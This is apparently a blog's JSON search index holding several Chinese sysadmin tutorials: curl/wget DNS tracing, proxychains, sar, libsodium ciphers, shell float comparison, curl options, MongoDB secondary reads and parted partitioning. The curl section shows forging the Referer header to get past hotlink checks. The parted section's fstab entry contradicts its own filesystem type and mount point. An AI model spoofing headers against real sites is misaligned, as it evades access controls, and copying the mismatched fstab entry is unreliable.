libcurl.so.4、libz.so.1、libpthread.so.0、libssl.so.1等等......接下来打开了文件：&#x2F;etc&#x2F;ssl&#x2F;openssl.cnf和&#x2F;lib64&#x2F;locale&#x2F;locale-archive,不知道它要干嘛！...... 1234567891011121314151617181920write(2, &quot;Rebuilt URL to: web.test.zone&#x2F;\\n&quot;, 32Rebuilt URL to: web.test.zone&#x2F;) &#x3D; 32mmap(NULL, 8392704, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0) &#x3D; 0x7fbd43387000......write(2, &quot;*&quot;, 1*) &#x3D; 1write(2, &quot; &quot;, 1 ) &#x3D; 1write(2, &quot; Trying 192.168.10.25...\\n&quot;, 23 Trying 192.168.10.25...上面这部分就是域名解析了，完全懵逼的状态，通过尼玛什么机制获取的IP地址呢？？？下面的部分就是直接去请求资源了...write(2, &quot;GET &#x2F; HTTP&#x2F;1.1\\r\\n&quot;, 16GET &#x2F; HTTP&#x2F;1.1) &#x3D; 16write(2, &quot;&gt;&quot;, 1&gt;) &#x3D; 1write(2, &quot; &quot;, 1 ) &#x3D; 1write(2, &quot;Host: web.test.zone\\r\\n&quot;, 22Host: web.test.zone) &#x3D; 22write(2, &quot;&gt;&quot;, 1&gt;) &#x3D; 1write(2, &quot; &quot;, 1 ) &#x3D; 1write(2, &quot;User-Agent: curl&#x2F;7.45.0\\r\\n&quot;, 25User-Agent: curl&#x2F;7.45.0 wget1strace wget web.test.zone 摘出关键部分 1234......最开始加载模块:libpcre.so.1、libssl.so.1.0等等...... 12345678910111213141516171819202122232425262728#查找了&#x2F;etc&#x2F;resalv.conf文件open(&quot;&#x2F;etc&#x2F;resolv.conf&quot;, O_RDONLY|O_CLOEXEC) &#x3D; 3fstat(3, &#123;st_mode&#x3D;S_IFREG|0644, st_size&#x3D;105, ...&#125;) &#x3D; 0#查找了&#x2F;etc&#x2F;nsswitch.conf文件open(&quot;&#x2F;etc&#x2F;nsswitch.conf&quot;, O_RDONLY|O_CLOEXEC) &#x3D; 3fstat(3, &#123;st_mode&#x3D;S_IFREG|0644, st_size&#x3D;508, ...&#125;) &#x3D; 0 &#x3D; 0#查找了&#x2F;etc&#x2F;host.conf文件open(&quot;&#x2F;etc&#x2F;host.conf&quot;, O_RDONLY|O_CLOEXEC) &#x3D; 3fstat(3, &#123;st_mode&#x3D;S_IFREG|0644, st_size&#x3D;935, ...&#125;) &#x3D; 0#查找了&#x2F;etc&#x2F;hosts文件open(&quot;&#x2F;etc&#x2F;hosts&quot;, O_RDONLY|O_CLOEXEC) &#x3D; 3fstat(3, &#123;st_mode&#x3D;S_IFREG|0644, st_size&#x3D;1205, ...&#125;) &#x3D; 0#(可能是根据hosts优先原则)最后通过DNS获取到域名解析结果write(2, &quot;192.168.10.25&quot;, 192.168.10.25) &#x3D; 10write(2, &quot;, &quot;, 2, ) &#x3D; 2write(2, &quot;192.168.10.26&quot;, 192.168.10.26) &#x3D; 10write(2, &quot;\\n&quot;, 1) &#x3D; 1#拿着域名解析结果去请求数据write(2, &quot;Connecting to web.test.zone|10.&quot;..., 47Connecting to web.test.zone... ) &#x3D; 47socket(PF_INET, SOCK_STREAM, IPPROTO_IP) &#x3D; 3connect(3, &#123;sa_family&#x3D;AF_INET, sin_port&#x3D;htons(80), sin_addr&#x3D;inet_addr(&quot;192.168.10.25&quot;)&#125;, 16) &#x3D; 0write(2, &quot;connected.\\n&quot;, 11connected. 总结123curl是通过libcurl跨平台库去实现的，暂且搞不懂curl是通过何种方式或规律一次获取的IP地址,不过从strace的结果中来看，它并没有遵循Bind DNS轮询IP地址去请求数据。相对于curl来说，一次wget请求，它把很多时间都用在了域名解析上，在查找hosts文件无果的情况下，通过类似dig的方式解析获取所有ip地址并去选择其一去请求数据，多次测试，结果是使用不同A记录IP地址去请求数据。 1对于以上结论，纯属个人观点，如有雷同，纯属巧合。我已经在stackoverflow发布了该话题，如果有大牛回答，我可能会更新我的观点。 其他-curl请求URL不使用缓存123curl请求url不使用缓存curl -H &#39;Cache-Control: no-cache&#39; http:&#x2F;&#x2F;www.example.com 基本无价值参考: haxx.se","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"curl","slug":"curl","permalink":"https://garywu520.github.io/tags/curl/"},{"name":"wget","slug":"wget","permalink":"https://garywu520.github.io/tags/wget/"},{"name":"curl请求url不使用缓存","slug":"curl请求url不使用缓存","permalink":"https://garywu520.github.io/tags/curl%E8%AF%B7%E6%B1%82url%E4%B8%8D%E4%BD%BF%E7%94%A8%E7%BC%93%E5%AD%98/"}]},{"title":"proxychains4 socks5代理神器","slug":"proxychains4-socks5代理神器","date":"2018-05-18T07:39:34.000Z","updated":"2018-05-18T08:02:59.484Z","comments":true,"path":"2018/05/18/proxychains4-socks5代理神器/","link":"","permalink":"https://garywu520.github.io/2018/05/18/proxychains4-socks5%E4%BB%A3%E7%90%86%E7%A5%9E%E5%99%A8/","excerpt":"1Github: https:&#x2F;&#x2F;github.com&#x2F;rofl0r&#x2F;proxychains-ng 1功能：让命令支持SOCKS5代理","text":"1Github: https:&#x2F;&#x2F;github.com&#x2F;rofl0r&#x2F;proxychains-ng 1功能：让命令支持SOCKS5代理 clone源码安装12345clone以上源码到本地&#x2F;opt目录cd &#x2F;opt&#x2F;proxychains-master.&#x2F;configure --sysconfdir&#x3D;&#x2F;usr&#x2F;local&#x2F;etcmake &amp;&amp; make install 配置1vim &#x2F;etc&#x2F;proxychains.conf 1234567891011#推荐使用如下配置strict_chainproxy_dnsremote_dns_subnet 224tcp_read_time_out 15000tcp_connect_time_out 8000localnet 127.0.0.0&#x2F;255.0.0.0quiet_mode[ProxyList]socks5 127.0.0.1 1080 1注: 模板文件在&quot; (源码编译目录)&#x2F;src&#x2F;proxychains.conf &quot; 测试12345yum走代理proxychains4 yum install youtube-dl下载一个2分钟的4k Youtube视频proxychains4 youtube-dl https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;IRSVsCBtgnk","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"SOCKS5","slug":"SOCKS5","permalink":"https://garywu520.github.io/tags/SOCKS5/"},{"name":"proxychains","slug":"proxychains","permalink":"https://garywu520.github.io/tags/proxychains/"},{"name":"命令代理","slug":"命令代理","permalink":"https://garywu520.github.io/tags/%E5%91%BD%E4%BB%A4%E4%BB%A3%E7%90%86/"}]},{"title":"sar命令-Linux查找系统瓶颈利器","slug":"sar命令-Linux查找系统瓶颈利器","date":"2018-05-16T08:03:13.000Z","updated":"2018-05-16T08:52:41.794Z","comments":true,"path":"2018/05/16/sar命令-Linux查找系统瓶颈利器/","link":"","permalink":"https://garywu520.github.io/2018/05/16/sar%E5%91%BD%E4%BB%A4-Linux%E6%9F%A5%E6%89%BE%E7%B3%BB%E7%BB%9F%E7%93%B6%E9%A2%88%E5%88%A9%E5%99%A8/","excerpt":"12345SAR是一个在Unix和Linux操作系统中用来收集、报告和保存CPU、内存、输入输出端口使用情况的命令。sar 命令将操作系统中选定的累计活动计数器的内容写到标准输出。基于 number 和 interval 参数的值，记帐系统按指定次数，以指定的时间间隔（以秒为单位）写入信息。number 参数的缺省采样时间间隔为 1 秒。收集的数据也可以保存在由 -o file 标志指定的文件中。当指定 –X 选项时，sar 命令会生成 XML 文件。","text":"12345SAR是一个在Unix和Linux操作系统中用来收集、报告和保存CPU、内存、输入输出端口使用情况的命令。sar 命令将操作系统中选定的累计活动计数器的内容写到标准输出。基于 number 和 interval 参数的值，记帐系统按指定次数，以指定的时间间隔（以秒为单位）写入信息。number 参数的缺省采样时间间隔为 1 秒。收集的数据也可以保存在由 -o file 标志指定的文件中。当指定 –X 选项时，sar 命令会生成 XML 文件。 安装12345yum install sysstat 当启动sysstat服务后，报告就会被写入到日志文件“&#x2F;var&#x2F;log&#x2F;sa&#x2F;saDD”中并且已经存在的文档将会被归档。DD表示当前日期。systemctl start sysstatsystemctl enable sysstat 1234567[root@bogon ~]# cat &#x2F;etc&#x2F;cron.d&#x2F;sysstat #每10分钟运行一次系统活动收集*&#x2F;10 * * * * root &#x2F;usr&#x2F;lib64&#x2F;sa&#x2F;sa1 1 1#每天形成一份报告53 23 * * * root &#x2F;usr&#x2F;lib64&#x2F;sa&#x2F;sa2 -A其中,crontab文件负责收集和生成报告。 1234567SysStat的默认Config配置文件[root@bogon ~]# grep -v &quot;^[#]&quot; &#x2F;etc&#x2F;sysconfig&#x2F;sysstatHISTORY&#x3D;28COMPRESSAFTER&#x3D;31SADC_OPTIONS&#x3D;&quot;-S DISK&quot;ZIP&#x3D;&quot;bzip2&quot; 示例每隔2秒动态生成5次CPU的使用情况12345678910111213141516171819[root@bogon ~]# sar -u 2 5Linux 3.10.0-327.el7.x86_64 (bogon) 05&#x2F;16&#x2F;2018 _x86_64_ (8 CPU)04:17:00 AM CPU %user %nice %system %iowait %steal %idle04:17:02 AM all 0.00 0.00 0.00 0.00 0.00 100.0004:17:04 AM all 0.00 0.00 0.06 0.00 0.00 99.9404:17:06 AM all 0.00 0.00 0.00 0.00 0.00 100.0004:17:08 AM all 0.00 0.00 0.00 0.00 0.00 100.0004:17:10 AM all 0.00 0.00 0.00 0.00 0.00 100.00Average: all 0.00 0.00 0.01 0.00 0.00 99.99%user 用户模式下消耗的CPU时间的比例；%nice 通过nice改变了进程调度优先级的进程，在用户模式下消耗的CPU时间的比例%system 系统模式下消耗的CPU时间的比例；%iowait CPU等待磁盘I&#x2F;O导致空闲状态消耗的时间比例；%steal 利用Xen等操作系统虚拟化技术，等待其它虚拟CPU计算占用的时间比例；%idle CPU空闲时间比例；注：如果 &quot;%iowait&quot; 这一项是一个超过0的长时间值，那么我们就要考虑是否在输入输出系统方面存在瓶颈(比如硬盘或者网络)。 使用-q选项查看平均负载123456789101112131415[root@bogon ~]# sar -q 2 5Linux 3.10.0-327.el7.x86_64 (bogon) 05&#x2F;16&#x2F;2018 _x86_64_ (8 CPU)04:37:43 AM runq-sz plist-sz ldavg-1 ldavg-5 ldavg-15 blocked04:37:45 AM 0 163 0.00 0.01 0.05 004:37:47 AM 0 163 0.00 0.01 0.05 004:37:49 AM 0 163 0.00 0.01 0.05 004:37:51 AM 0 163 0.00 0.01 0.05 004:37:53 AM 0 163 0.00 0.01 0.05 0Average: 0 163 0.00 0.01 0.05 0runq-sz：运行队列的长度（等待运行的进程数）plist-sz：进程列表中进程（processes）和线程（threads）的数量ldavg-1：最后1分钟的系统平均负载 ldavg-5：过去5分钟的系统平均负载ldavg-15：过去15分钟的系统平均负载 使用-o选项保存sar命令的输出结果1[root@bogon ~]# sar 2 5 -o &#x2F;tmp&#x2F;cpu_data.log &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 使用”sar -f”输出结果(否则将出现乱码)： 123456[root@bogon ~]# sar -f &#x2F;tmp&#x2F;cpu_data.log Linux 3.10.0-327.el7.x86_64 (bogon) 05&#x2F;16&#x2F;2018 _x86_64_ (8 CPU)04:19:56 AM CPU %user %nice %system %iowait %steal %idle04:19:58 AM all 0.00 0.00 0.06 0.00 0.00 99.94...... 使用-r选项生成内存的使用情况报告12345678910[root@bogon ~]# sar -r 2 5Linux 3.10.0-327.el7.x86_64 (bogon) 05&#x2F;16&#x2F;2018 _x86_64_ (8 CPU)......kbmemfree：这个值和free命令中的free值基本一致,所以它不包括buffer和cache的空间.kbmemused：这个值和free命令中的used值基本一致,所以它包括buffer和cache的空间.%memused：物理内存使用率，这个值是kbmemused和内存总量(不包括swap)的一个百分比.kbbuffers和kbcached：这两个值就是free命令中的buffer和cache.kbcommit：保证当前系统所需要的内存,即为了确保不溢出而需要的内存(RAM+swap).%commit：这个值是kbcommit与内存总量(包括swap)的一个百分比. -w选项查看页面交换发生情况1234567891011[root@bogon ~]# sar -w 1 3Linux 3.10.0-327.el7.x86_64 (bogon) 05&#x2F;16&#x2F;2018 _x86_64_ (8 CPU)04:41:37 AM pswpin&#x2F;s pswpout&#x2F;s04:41:38 AM 0.00 0.0004:41:39 AM 0.00 0.0004:41:40 AM 0.00 0.00Average: 0.00 0.00pswpin&#x2F;s：每秒系统换入的交换页面（swap page）数量pswpout&#x2F;s：每秒系统换出的交换页面（swap page）数量 使用-d选项生成块设备使用情况报告123456789-d 选项在sar命令中被用以显示块设备的状态报告。在 -d 后面加上 -p (pretty-print)选项可以增强 dev 列的可读性.[root@bogon ~]# sar -d -p 2 4Linux 3.10.0-327.el7.x86_64 (bogon) 05&#x2F;16&#x2F;2018 _x86_64_ (8 CPU)04:30:46 AM DEV tps rd_sec&#x2F;s wr_sec&#x2F;s avgrq-sz avgqu-sz await svctm %util04:30:48 AM sda 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.0004:30:48 AM sdb 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00...... 使用-n选项生成网络使用情况报告12-n选项在sar命令中被用来生成网络使用情况的统计报告。下面是语法规则：# sar -n &#123;keyword&#125; or &#123;ALL&#125; 1# sar -n ALL 用-f读sar日志文件1sar的日志文件是保存在“&#x2F;var&#x2F;log&#x2F;sa&#x2F;saDD”里的。使用-f选项可以查看日志文件。 1[root@bogon ~]# sar -r -f &#x2F;var&#x2F;log&#x2F;sa&#x2F;sa16 输出前两个核心CPU的使用情况1[root@bogon ~]# sar -u -P 0,1 总结12345要判断系统瓶颈问题，通常需几个sar命令选项结合起来；怀疑CPU存在瓶颈，可用 sar -u 和 sar -q 等来查看怀疑内存存在瓶颈，可用sar -B、sar -r 和 sar -W 等来查看怀疑I&#x2F;O存在瓶颈，可用 sar -b、sar -u 和 sar -d 等来查看 sar参数说明123456789101112131415161718-A 汇总所有的报告-a 报告文件读写使用情况-B 报告附加的缓存的使用情况-b 报告缓存的使用情况-c 报告系统调用的使用情况-d 报告磁盘的使用情况-g 报告串口的使用情况-h 报告关于buffer使用的统计数据-m 报告IPC消息队列和信号量的使用情况-n 报告命名cache的使用情况-p 报告调页活动的使用情况-q 报告运行队列和交换队列的平均长度-R 报告进程的活动情况-r 报告没有使用的内存页面和硬盘块-u 报告CPU的利用率-v 报告进程、i节点、文件和锁表状态-w 报告系统交换活动状况-y 报告TTY设备活动状况 参考: IBM等","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"系统瓶颈","slug":"系统瓶颈","permalink":"https://garywu520.github.io/tags/%E7%B3%BB%E7%BB%9F%E7%93%B6%E9%A2%88/"},{"name":"sar","slug":"sar","permalink":"https://garywu520.github.io/tags/sar/"},{"name":"System Activity Reporter","slug":"System-Activity-Reporter","permalink":"https://garywu520.github.io/tags/System-Activity-Reporter/"},{"name":"系统活动情况报告","slug":"系统活动情况报告","permalink":"https://garywu520.github.io/tags/%E7%B3%BB%E7%BB%9F%E6%B4%BB%E5%8A%A8%E6%83%85%E5%86%B5%E6%8A%A5%E5%91%8A/"}]},{"title":"带有附加数据的加密算法-libsodium","slug":"带有附加数据的认证加密-libsodium","date":"2018-05-16T02:17:14.000Z","updated":"2018-05-16T02:51:41.647Z","comments":true,"path":"2018/05/16/带有附加数据的认证加密-libsodium/","link":"","permalink":"https://garywu520.github.io/2018/05/16/%E5%B8%A6%E6%9C%89%E9%99%84%E5%8A%A0%E6%95%B0%E6%8D%AE%E7%9A%84%E8%AE%A4%E8%AF%81%E5%8A%A0%E5%AF%86-libsodium/","excerpt":"Libsodium支持的加密1Libsodium 支持两种流行的加密算法: AES256-GCM 和 ChaCha20-Poly1305(原始版和IETF版) ，另一种是后者的一种变体，即: XChaCha20-Poly1305","text":"Libsodium支持的加密1Libsodium 支持两种流行的加密算法: AES256-GCM 和 ChaCha20-Poly1305(原始版和IETF版) ，另一种是后者的一种变体，即: XChaCha20-Poly1305 加密信息对比 加密方式 Key 大小 Nonce大小 Block大小 MAC 大小 对应libsodium版本 AES-256-GCM 256 比特 96比特 128 比特 128 比特 libsodium &gt;= 1.0.4 but requires hardware support. IETF standard; also implemented in many other libraries. ChaCha20-Poly1305 256 比特 64比特 512 比特 128 比特 libsodium &gt;= 0.6.0. Also implemented in {Libre,Open,Boring}SSL. ChaCha20-IETF-Poly1305 256 比特 96比特 512 比特 128 比特 libsodium &gt;= 1.0.4. IETF standard; also implemented in Ring, {Libre,Open,Boring}SSL and other libraries. XChaCha20-IETF-Poly1305 256 比特 192 比特 512 比特 128 比特 libsodium &gt;= 1.0.12. 加密方式选择1Xchacha20-poly1305-ietf是相对最安全的 AES-256-GCM12目前这种结构支持硬件加速，需要Intel SSSE3扩展，以及 aesni 和 pclmul。官方暂无计划将AES-256-GCM通过非硬件技术(即软件层)来实现 ChaCha20-Poly1305123456虽然AES-256-GCM在专用硬件上速度非常快，但在非专用硬件上性能要低得多。并且, AES容易受到缓存冲突时间的攻击。ChaCha20在纯软件方面加密就比AES快得多，在缺乏专用AES硬件的平台上速度比其快三倍。 并且, ChaCha20对定时攻击也不敏感。而Poly1305是一种高速信息验证码。ChaCha20流密码+Poly1305认证的组合的使得其成为了Salsa20-Poly1305加密方式的替代品。其于2015年5月成为IETF官方标准，所以目前很多主流操作系统均以支持ChaCha20-Poly1305， XChaCha20-IETF-Poly130512XChaCha20-Poly1305继承了ChaCha20-Poly1305所有优势并将随机文件nonce大小扩展到192位。这种扩展的随机数大小允许安全使用随机数。libsodium中的XChaCha20-Poly1305实现可在所有支持的体系结构中移植。这种加密需要 &gt;&#x3D;libsodium 1.0.12的版本方能支持。 翻译自:Libsodium官网","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"libsodium","slug":"libsodium","permalink":"https://garywu520.github.io/tags/libsodium/"},{"name":"AES-256-GCM","slug":"AES-256-GCM","permalink":"https://garywu520.github.io/tags/AES-256-GCM/"},{"name":"ChaCha20-Poly1305","slug":"ChaCha20-Poly1305","permalink":"https://garywu520.github.io/tags/ChaCha20-Poly1305/"},{"name":"XChaCha20-Poly1305","slug":"XChaCha20-Poly1305","permalink":"https://garywu520.github.io/tags/XChaCha20-Poly1305/"},{"name":"AEAD加密","slug":"AEAD加密","permalink":"https://garywu520.github.io/tags/AEAD%E5%8A%A0%E5%AF%86/"},{"name":"加密算法","slug":"加密算法","permalink":"https://garywu520.github.io/tags/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"}]},{"title":"shell if小数判断","slug":"shell-if小数判断","date":"2018-05-10T10:27:18.000Z","updated":"2018-05-10T10:34:03.375Z","comments":true,"path":"2018/05/10/shell-if小数判断/","link":"","permalink":"https://garywu520.github.io/2018/05/10/shell-if%E5%B0%8F%E6%95%B0%E5%88%A4%E6%96%AD/","excerpt":"1由于程序需要，我要判断一个小数是否大于另一个值。即一个浮点数是否大于另一个浮点数。","text":"1由于程序需要，我要判断一个小数是否大于另一个值。即一个浮点数是否大于另一个浮点数。 1234567加入$mya变量是一个浮点数，按照正常思路执行：# if [ $mya -le 4 ]; then echo &quot;ok&quot;;else echo &quot;fail&quot;; fi -bash: [: 5.7: integer expression expected shell报错：提示integer expression expected意思就是shell默认只能判断整数，而不是浮点数 123参考了大牛的方案，改为了如下：# if [ $(echo &quot;$mya &lt;&#x3D; 4&quot;|bc) &#x3D; 1 ]; then echo &quot;ok&quot;;else echo &quot;fail&quot;;fi 123456789101112测试：# if [ $(echo &quot;0.5 &lt;&#x3D; 4&quot;|bc) &#x3D; 1 ]; then echo &quot;ok&quot;;else echo &quot;fail&quot;;fi ok# if [ $(echo &quot;0.5 &gt;&#x3D; 4&quot;|bc) &#x3D; 1 ]; then echo &quot;ok&quot;;else echo &quot;fail&quot;;fi fail# if [ $(echo &quot;5.5 &gt;&#x3D; 4&quot;|bc) &#x3D; 1 ]; then echo &quot;ok&quot;;else echo &quot;fail&quot;;fi ok# if [ $(echo &quot;4.1 &gt;&#x3D; 4&quot;|bc) &#x3D; 1 ]; then echo &quot;ok&quot;;else echo &quot;fail&quot;;fi ok 1接下来终于可以愉快的写脚本了... 参考：nigelzeng","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"},{"name":"小数判断","slug":"小数判断","permalink":"https://garywu520.github.io/tags/%E5%B0%8F%E6%95%B0%E5%88%A4%E6%96%AD/"},{"name":"if判断","slug":"if判断","permalink":"https://garywu520.github.io/tags/if%E5%88%A4%E6%96%AD/"},{"name":"浮点数判断","slug":"浮点数判断","permalink":"https://garywu520.github.io/tags/%E6%B5%AE%E7%82%B9%E6%95%B0%E5%88%A4%E6%96%AD/"}]},{"title":"curl命令详解","slug":"curl命令详解","date":"2018-05-09T06:17:40.000Z","updated":"2018-05-09T07:30:28.103Z","comments":true,"path":"2018/05/09/curl命令详解/","link":"","permalink":"https://garywu520.github.io/2018/05/09/curl%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/","excerpt":"1234curl是一个利用URL规则在命令行下工作的强大文件传输工具。语法：# curl [option] [url]","text":"1234curl是一个利用URL规则在命令行下工作的强大文件传输工具。语法：# curl [option] [url] 常见参数12345678910111213141516-A&#x2F;--user-agent &lt;string&gt; 设置用户代理发送给服务器-b&#x2F;--cookie &lt;name&#x3D;string&#x2F;file&gt; cookie字符串或文件读取位置-c&#x2F;--cookie-jar &lt;file&gt; 操作结束后把cookie写入到这个文件中-C&#x2F;--continue-at &lt;offset&gt; 断点续转-D&#x2F;--dump-header &lt;file&gt; 把header信息写入到该文件中-e&#x2F;--referer 来源网址-f&#x2F;--fail 连接失败时不显示http错误-o&#x2F;--output 把输出写到该文件中-O&#x2F;--remote-name 把输出写到该文件中，保留远程文件的文件名-r&#x2F;--range &lt;range&gt; 检索来自HTTP&#x2F;1.1或FTP服务器字节范围-s&#x2F;--silent 静音模式。不输出任何东西-T&#x2F;--upload-file &lt;file&gt; 上传文件-u&#x2F;--user &lt;user[:password]&gt; 设置服务器的用户和密码-w&#x2F;--write-out [format] 什么输出完成后-x&#x2F;--proxy &lt;host[:port]&gt; 在给定的端口上使用HTTP代理-#&#x2F;--progress-bar 进度条显示当前的传送状态 基本用法1curl http:&#x2F;&#x2F;www.baidu.com 保存访问的网页12使用重定向功能保存curl http:&#x2F;&#x2F;www.baidu.com &gt;baidu.html 12使用内置option选项保存curl -o qq.html http:&#x2F;&#x2F;www.qq.com 测试网页返回值12curl -o &#x2F;dev&#x2F;null -s -w %&#123;http_code&#125; www.qq.com在脚本中，这是很常见的测试网站是否正常的用法 指定proxy服务器以及端口12通过-x 选项来支持设置http代理curl -x 10.10.10.100:1080 http:&#x2F;&#x2F;www.google.com 保存http的response里面的header信息1curl -D header.txt http:&#x2F;&#x2F;www.qq.com 模仿浏览器User-agent1curl -A &quot;Mozilla&#x2F;5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit&#x2F;48 (like Gecko) Safari&#x2F;48&quot; http:&#x2F;&#x2F;www.qq.com &gt; qq.html 参考：所有版本User-agent列表 伪造referer-盗链1很多服务器会检查http访问的referer从而来控制访问。比如：你是先访问首页，然后再访问首页中的邮箱页面。其中这里访问邮箱的referer地址就是访问首页成功后的页面地址，如果服务器发现对邮箱页面访问的referer地址不是首页的地址，就断定那是个盗连了 12curl中内置-e 选项可以自定义referercurl -e &quot;www.qq.com&quot; https:&#x2F;&#x2F;mail.qq.com 下载显示进度条12curl -# -O https:&#x2F;&#x2F;codeload.github.com&#x2F;shadowsocks&#x2F;shadowsocks-windows&#x2F;zip&#x2F;master注：-#表示显示进度条","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"curl","slug":"curl","permalink":"https://garywu520.github.io/tags/curl/"},{"name":"POST","slug":"POST","permalink":"https://garywu520.github.io/tags/POST/"},{"name":"cookie","slug":"cookie","permalink":"https://garywu520.github.io/tags/cookie/"},{"name":"response","slug":"response","permalink":"https://garywu520.github.io/tags/response/"},{"name":"模拟浏览器","slug":"模拟浏览器","permalink":"https://garywu520.github.io/tags/%E6%A8%A1%E6%8B%9F%E6%B5%8F%E8%A7%88%E5%99%A8/"},{"name":"伪造referer","slug":"伪造referer","permalink":"https://garywu520.github.io/tags/%E4%BC%AA%E9%80%A0referer/"}]},{"title":"让mongo的从库支持读操作","slug":"让mongo的从库支持读操作","date":"2018-04-28T03:41:26.000Z","updated":"2018-04-28T03:52:04.562Z","comments":true,"path":"2018/04/28/让mongo的从库支持读操作/","link":"","permalink":"https://garywu520.github.io/2018/04/28/%E8%AE%A9mongo%E7%9A%84%E4%BB%8E%E5%BA%93%E6%94%AF%E6%8C%81%E8%AF%BB%E6%93%8D%E4%BD%9C/","excerpt":"1对于replica set 中的secondary 节点默认是不可读的。通过在连接时指定或者在主库指定slaveOk，由Secondary来分担读的压力，Primary只承担写操作。","text":"1对于replica set 中的secondary 节点默认是不可读的。通过在连接时指定或者在主库指定slaveOk，由Secondary来分担读的压力，Primary只承担写操作。 1234567891011如果通过shell访问mongo，要在secondary进行查询。会出现如下错误：#mongo 192.168.10.10:27017SECONDARY&gt; show dbs;2018-04-28T11:28:17.596+0800 E QUERY Error: listDatabases failed:&#123; &quot;note&quot; : &quot;from execCommand&quot;, &quot;ok&quot; : 0, &quot;errmsg&quot; : &quot;not master&quot; &#125; at Error (&lt;anonymous&gt;) at Mongo.getDBs (src&#x2F;mongo&#x2F;shell&#x2F;mongo.js:47:15) at shellHelper.show (src&#x2F;mongo&#x2F;shell&#x2F;utils.js:630:33) at shellHelper (src&#x2F;mongo&#x2F;shell&#x2F;utils.js:524:36) at (shellhelp2):1:1 at src&#x2F;mongo&#x2F;shell&#x2F;mongo.js:47SECONDARY&gt; 有两种方法实现从机的查询：第一种方法：1db.getMongo().setSlaveOk(); 第二种方法：1rs.slaveOk(); 1234但是这种方式有一个缺点就是，下次再通过mongo进入实例的时候，查询仍然会报错，为此可以通过下列方式vi ~&#x2F;.mongorc.js增加一行rs.slaveOk();这样的话以后每次通过mongo命令进入都可以查询了 第三种方法:1在配置mongo的时候增加slave-ok&#x3D;&quot;true&quot; 来实现从secondary中进行读操作。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"mongodb","slug":"mongodb","permalink":"https://garywu520.github.io/tags/mongodb/"},{"name":"mongo","slug":"mongo","permalink":"https://garywu520.github.io/tags/mongo/"},{"name":"rs.slaveOk()","slug":"rs-slaveOk","permalink":"https://garywu520.github.io/tags/rs-slaveOk/"},{"name":"mongodb从库读操作","slug":"mongodb从库读操作","permalink":"https://garywu520.github.io/tags/mongodb%E4%BB%8E%E5%BA%93%E8%AF%BB%E6%93%8D%E4%BD%9C/"}]},{"title":"Parted给大容量硬盘分区格式化与挂载","slug":"Parted给大容量硬盘分区格式化与挂载","date":"2018-04-27T10:06:10.000Z","updated":"2018-04-27T10:15:55.690Z","comments":true,"path":"2018/04/27/Parted给大容量硬盘分区格式化与挂载/","link":"","permalink":"https://garywu520.github.io/2018/04/27/Parted%E7%BB%99%E5%A4%A7%E5%AE%B9%E9%87%8F%E7%A1%AC%E7%9B%98%E5%88%86%E5%8C%BA%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%8E%E6%8C%82%E8%BD%BD/","excerpt":"1使用parted给大于2T的硬盘分区","text":"1使用parted给大于2T的硬盘分区 12345678910111213141516171819202122232425262728293031323334353637383940查看现有设备fdisk -l使用parted分区#parted(parted) select &#x2F;dev&#x2F;sdb &#x2F;&#x2F;选择磁盘sdbUsing &#x2F;dev&#x2F;sdb(parted) mklabel gpt &#x2F;&#x2F;将MBR磁盘格式化为GPT(parted) mkpart primary 0 -1 &#x2F;&#x2F;将整块磁盘分成一个分区(parted) printquit###################################或者创建多个分区mkpart primary 0 3Gmkpart primary 3G 10Gmkpart primary 10G -1###################################快速格式化mkfs.ext4 -T largefile &#x2F;dev&#x2F;sdb1 对&#x2F;dev&#x2F;sdb1添加（修改）标签为&#x2F;data1e2label &#x2F;dev&#x2F;sdb1 &#x2F;data1 查看分区的标签e2label &#x2F;dev&#x2F;sdb1 在&#x2F;分区下创建一个配额的挂载点mkdir &#x2F;data&#x2F;B对该分区进行手动挂载mount &#x2F;dev&#x2F;sdb1 &#x2F;data&#x2F;B 查看挂载的分区df -h 最后只需在fstab中添加如下一行或使用UUID，就能完成分区的自动挂载[root@server ~]# vim &#x2F;etc&#x2F;fstab&#x2F;dev&#x2F;sdb1 &#x2F;data1 ext3 defaults 0 